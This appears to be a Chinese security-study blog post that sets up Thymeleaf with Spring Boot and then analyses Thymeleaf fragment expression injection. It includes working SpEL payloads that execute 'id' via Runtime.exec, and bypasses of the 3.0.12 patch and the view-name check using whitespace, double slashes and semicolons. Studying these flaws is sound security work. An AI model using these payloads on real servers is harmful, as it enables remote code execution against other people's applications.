---
title: thymeleaf简单入门
date: 2022-12-16 08:25:21
tags:
      -- java
      -- thymeleaf

---

## thymeleaf fragment注入学习

### 与springBoot整合

### 步骤

##### 1.导入依赖,版本可以不写,由springBoot统一管理

```xml
<dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>
```

##### 2.在resources文件夹下面创建templates文件夹,一般所有模板均放在此文件夹下面

![image-20221104235220749](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235220749.png)

##### 3.配置模板文件路径的前后缀

![image-20221104235352336](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235352336.png)

##### 4.配置打包后的静态资源存放路径,一般不需要写

![image-20221104235458060](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235458060.png)

##### 5.编写代码

![image-20221104235637768](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235637768.png)

访问/index即可



#### 注入原理

该漏洞有版本限制,目前在springBoot2.2.0.RELEASE版本可以执行

[原理文章](https://github.com/veracode-research/spring-view-manipulation/)

before loading the template from the filesystem, [Spring ThymeleafView](https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java) class parses the template name as an expression:

thymeleaf的fragment 功能会将::后面的字符串当成表达式解析

fragement功能实现效果类似于vue动态路由传递一个参数过去让其选择性显示某一个div

![image-20221105005907494](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105005907494.png)

```java
try {
   // By parsing it as a standard expression, we might profit from the expression cache
   fragmentExpression = (FragmentExpression) parser.parseExpression(context, "~{" + viewTemplateName + "}");
}
```

##### payload

```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```



#### 原理简单跟进

spel表达式则需要再额外学习一下,这里先跟着研究一下Payload的简单构造原理

#### ![image-20221105180720931](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105180720931.png)

上面这段表明只有当模板名称包含::的时候,才能进入到parseExpression

打断点跟进,发现在这个方法中会执行

![image-20221105182319525](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105182319525.png)

在这里通过正则匹配到__  __包裹的内容

![image-20221105182858029](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105182858029.png)

最后执行的时候会被还原成一个标准的spel表达式

![image-20221105183035030](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105183035030.png)

**以上逻辑仅限于Thymeleaf 3.0-3.0.12(不含3.0.12)**     

## Thymeleaf 3.0.12

在3.0.12版本发布了一个补丁

其新增了一个这样的函数,当调用表达式的时候，会经过该函数的判断

```java
public static boolean containsSpELInstantiationOrStatic(final String expression) {
        final int explen = expression.length();
        int n = explen;
        int ni = 0; // index for computing position in the NEW_ARRAY
        int si = -1;
        char c;
        while (n-- != 0) {
            c = expression.charAt(n);
            if (ni < NEW_LEN
                    && c == NEW_ARRAY[ni]
                    && (ni > 0 || ((n + 1 < explen) && Character.isWhitespace(expression.charAt(n + 1))))) {
                ni++;
                if (ni == NEW_LEN && (n == 0 || !Character.isJavaIdentifierPart(expression.charAt(n - 1)))) {
                    return true; // we found an object instantiation
                }
                continue;
            }

            if (ni > 0) {
                n += ni;
                ni = 0;
                if (si < n) {
                    // This has to be restarted too
                    si = -1;
                }
                continue;
            }

            ni = 0;

            if (c == ')') {
                si = n;
            } else if (si > n && c == '('
                        && ((n - 1 >= 0) && (expression.charAt(n - 1) == 'T'))
                        && ((n - 1 == 0) || !Character.isJavaIdentifierPart(expression.charAt(n - 2)))) {
                return true;
            } else if (si > n && !(Character.isJavaIdentifierPart(c) || c == '.')) {
                si = -1;
            }

        }
        return false;
    }
```

可以看到其主要逻辑是首先 倒序检测是否包含 `wen`关键字、在`(`的左边的字符是否是`T`，如包含，那么认为找到了一个实例化对象，返回`true`，阻止该表达式的执行。

因此要绕过这个函数，只要满足三点：
1、表达式中不能含有关键字`new`
2、在`(`的左边的字符不能是`T`
3、不能在`T`和`(`中间添加的字符使得原表达式出现问题

三梦师傅给出的答案是%20(空格)，在copanda的研究中发现其实还有%0a(换行)、%09(制表符)，此外，通过 fuzzing 同样可以找到很多可以利用的字符

##### payload

```
home/__${new java.util.Scanner(T (java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

#### 当视图名与当前path一致的时候

就是类似这样

![image-20221105185826610](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105185826610.png)

那么就会经过`SpringRequestUtils.java`中的`checkViewNameNotInRequest`函数检测

##### 绕过方法

###### 1.两个/

```
user//__${new java.util.Scanner(T (java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

###### 2.分号

```
user/;__${new java.util.Scanner(T (java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

